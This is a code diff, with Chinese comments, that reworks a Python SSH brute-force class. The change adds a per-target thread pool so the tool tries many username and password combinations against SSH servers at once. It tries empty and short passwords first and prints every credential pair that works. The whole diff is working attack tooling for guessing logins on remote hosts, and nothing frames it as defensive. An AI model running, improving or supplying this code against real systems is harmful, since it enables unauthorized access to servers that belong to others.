@@ -96,22 +96,20 @@ class SSHBruteforce:
             except:
                 pass
 
-    def check_target(self, ip: str, port: int) -> None:
-        """检查单个目标"""
-        if ip in self.skip_ips:
-            return
-
-        # 首先验证SSH服务
+    def scan_target(self, ip: str, port: int) -> None:
+        """扫描单个SSH目标的所有用户名和密码组合"""
         if not self.verify_ssh(ip, port):
             with self._lock:
                 self.errors += 1
-                self.skip_ips.add(ip)
             return
 
-        # 添加到有效目标列表
         self.valid_targets.add(ip)
-
-        try:
+        
+        # 为这个目标创建独立的线程池
+        with ThreadPoolExecutor(max_workers=5) as target_executor:
+            futures = []
+            
+            # 为每个用户名创建任务
             for username in self.default_users:
                 if ip in self.skip_ips:
                     break
@@ -123,36 +121,50 @@ class SSHBruteforce:
                 ]
                 
                 # 优先尝试空密码和简单密码
-                for password in sorted(passwords, key=len):
+                passwords.sort(key=len)
+                
+                # 提交密码尝试任务
+                for password in passwords:
                     if ip in self.skip_ips:
                         break
                         
-                    with self._lock:
-                        self.current_attempts += 1
-                        self._current_user = username
-                        self._current_pass = password
-                    
-                    try:
-                        result = self.try_login(ip, port, username, password)
-                        if result:
-                            username, password = result
-                            with self._lock:
-                                if ip not in self.results:
-                                    self.results[ip] = []
-                                self.results[ip].append({
-                                    'port': port,
-                                    'username': username,
-                                    'password': password
-                                })
-                                print(f"\r{' ' * 100}\r{Fore.RED}[+] SSH Found: {ip}:{port} {username}:{password}{Style.RESET_ALL}")
-                            return
-                    except socket.timeout:
-                        continue
+                    futures.append(
+                        target_executor.submit(
+                            self.try_credential, 
+                            ip, 
+                            port, 
+                            username, 
+                            password
+                        )
+                    )
+            
+            # 处理该目标的所有尝试结果
+            for future in as_completed(futures):
+                try:
+                    result = future.result()
+                    if result:
+                        username, password = result
+                        with self._lock:
+                            if ip not in self.results:
+                                self.results[ip] = []
+                            self.results[ip].append({
+                                'port': port,
+                                'username': username,
+                                'password': password
+                            })
+                            print(f"\r{' ' * 100}\r{Fore.RED}[+] SSH Found: {ip}:{port} {username}:{password}{Style.RESET_ALL}")
+                        return  # 找到一个成功的就停止
+                except Exception:
+                    continue
 
-        except Exception:
-            with self._lock:
-                self.errors += 1
-                self.skip_ips.add(ip)
+    def try_credential(self, ip: str, port: int, username: str, password: str) -> Optional[Tuple[str, str]]:
+        """尝试单个凭据组合"""
+        with self._lock:
+            self.current_attempts += 1
+            self._current_user = username
+            self._current_pass = password
+        
+        return self.try_login(ip, port, username, password)
 
     def scan(self, ssh_ports: Dict[str, Set[int]], userfile: str = None, passfile: str = None) -> Dict:
         """执行SSH爆破"""
@@ -179,31 +191,16 @@ class SSHBruteforce:
         
         start_time = time.time()
         try:
-            # 首先验证所有目标
-            print(f"{Fore.BLUE}[*] Verifying SSH services...{Style.RESET_ALL}")
-            valid_targets = {}
-            for ip, ports in ssh_ports.items():
-                for port in ports:
-                    if self.verify_ssh(ip, port):
-                        if ip not in valid_targets:
-                            valid_targets[ip] = set()
-                        valid_targets[ip].add(port)
-                        self.valid_targets.add(ip)
-
-            if not valid_targets:
-                print(f"{Fore.YELLOW}[*] No valid SSH services found.{Style.RESET_ALL}\n")
-                return {}
-
-            print(f"{Fore.BLUE}[*] Found {len(valid_targets)} valid SSH services.{Style.RESET_ALL}")
-
-            # 开始爆破
+            # 为每个目标创建独立的扫描线程
             with ThreadPoolExecutor(max_workers=self.threads) as executor:
                 futures = []
-                for ip, ports in valid_targets.items():
+                for ip, ports in ssh_ports.items():
                     for port in ports:
-                        futures.append(executor.submit(self.check_target, ip, port))
+                        futures.append(
+                            executor.submit(self.scan_target, ip, port)
+                        )
                 
-                # 显示进度
+                # 显示总体进度
                 completed = 0
                 total = len(futures)
                 
